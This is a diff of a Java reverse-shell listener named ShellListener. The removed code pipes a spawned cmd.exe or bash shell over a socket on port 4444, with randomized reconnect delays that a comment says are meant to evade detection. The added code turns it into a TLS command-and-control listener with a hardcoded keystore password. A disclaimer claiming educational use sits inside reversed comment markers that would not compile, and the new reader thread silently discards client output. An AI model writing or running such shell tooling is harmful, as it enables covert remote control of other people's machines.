@@ -1,75 +1,72 @@
+*/
+This code is provided for educational and authorized security testing purposes ONLY.
+
+By using this code, you agree that:
+1. You have explicit permission to test the target system.
+2. The author takes NO responsibility for misuse, damages, or legal consequences.
+3. Unauthorized use on systems you do not own or have permission for is ILLEGAL.
+
+/*
 package NetworkShell;
-
+import javax.net.ssl.*;
 import java.io.*;
-import java.net.*;
-import java.util.Random;
-
-//listener for reverse shell to allow connection within same network
+import java.security.KeyStore;
 
 public class ShellListener {
-    public static void main(String[] args) {
+
+    public static void main(String[] args) throws Exception {
         int port = 4444;
-        Random random = new Random();
-        boolean isConnected = false;
 
-        while (true) {  // run forever
-            try (ServerSocket serverSocket = new ServerSocket(port)) {
-                System.out.println("Listening for incoming connection on port " + port + "...");
+        String osName = System.getProperty("os.name").toLowerCase();
+        boolean isWindows = osName.contains("win");
 
-                try (Socket socket = serverSocket.accept()) {
-                    System.out.println("Connection received from " + socket.getInetAddress());
-                    isConnected = true;  // connection established
+        KeyStore keyStore = KeyStore.getInstance("JKS");
+        try (FileInputStream fis = new FileInputStream("/NetworkShell/shellkeystore.jks")) {
+            keyStore.load(fis, "password".toCharArray());
+        }
 
-                    String os = System.getProperty("os.name").toLowerCase();
-                    ProcessBuilder pb;
-                    if (os.contains("win")) {
-                        pb = new ProcessBuilder("cmd.exe");
-                    } else {
-                        pb = new ProcessBuilder("/bin/bash");
-                    }
+        KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
+        kmf.init(keyStore, "password".toCharArray());
 
-                    pb.redirectErrorStream(true);
-                    Process process = pb.start();
+        SSLContext sslContext = SSLContext.getInstance("TLS");
+        sslContext.init(kmf.getKeyManagers(), null, null);
 
-                    InputStream processInput = process.getInputStream();
-                    OutputStream processOutput = process.getOutputStream();
-                    InputStream socketInput = socket.getInputStream();
-                    OutputStream socketOutput = socket.getOutputStream();
+        SSLServerSocketFactory ssf = sslContext.getServerSocketFactory();
+        SSLServerSocket server = (SSLServerSocket) ssf.createServerSocket(port);
 
-                    while (!socket.isClosed() && process.isAlive()) {
-                        while (processInput.available() > 0) {
-                            socketOutput.write(processInput.read());
-                        }
-                        while (socketInput.available() > 0) {
-                            processOutput.write(socketInput.read());
-                        }
+        System.out.println("Listening for TLS connections on port " + port);
 
-                        socketOutput.flush();
-                        processOutput.flush();
+        while (true) {
+            SSLSocket client = (SSLSocket) server.accept();
+            System.out.println("Connection received from " + client.getInetAddress());
 
-                        Thread.sleep(50);
-                    }
+            new Thread(() -> handleClient(client, isWindows)).start();
+        }
+    }
 
-                    process.destroy();
-                    System.out.println("Shell closed.");
-                    isConnected = false;  // reset for retry
-                } catch (Exception e) {
-                    System.err.println("Error during connection: " + e.getMessage());
-                    e.printStackTrace();
+    private static void handleClient(SSLSocket client, boolean isWindows) {
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
+             BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(client.getOutputStream()));
+             BufferedReader console = new BufferedReader(new InputStreamReader(System.in))) {
+
+            new Thread(() -> {
+                try {
+                    String line;
+                    while ((line = reader.readLine()) != null) {}
+                } catch (IOException e) {
+                    System.err.println("Client disconnected");
                 }
-            } catch (IOException e) {
-                System.err.println("Could not listen on port " + port);
-                e.printStackTrace();
+            }).start();
+
+            String cmd;
+            while ((cmd = console.readLine()) != null) {
+                writer.write(cmd + (isWindows ? "\r\n" : "\n"));
+                writer.flush();
             }
 
-            try {
-                int wait = 1000 + random.nextInt(14000); // 1 to 15 seconds to make it more harder to detect as not following  set pattern
-                System.out.println("Attempting to reconnect in " + wait + " milliseconds.");
-                Thread.sleep(wait);
-            } catch (InterruptedException ex) {
-                System.err.println("Sleep interrupted");
-                ex.printStackTrace();
-            }
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 }
+
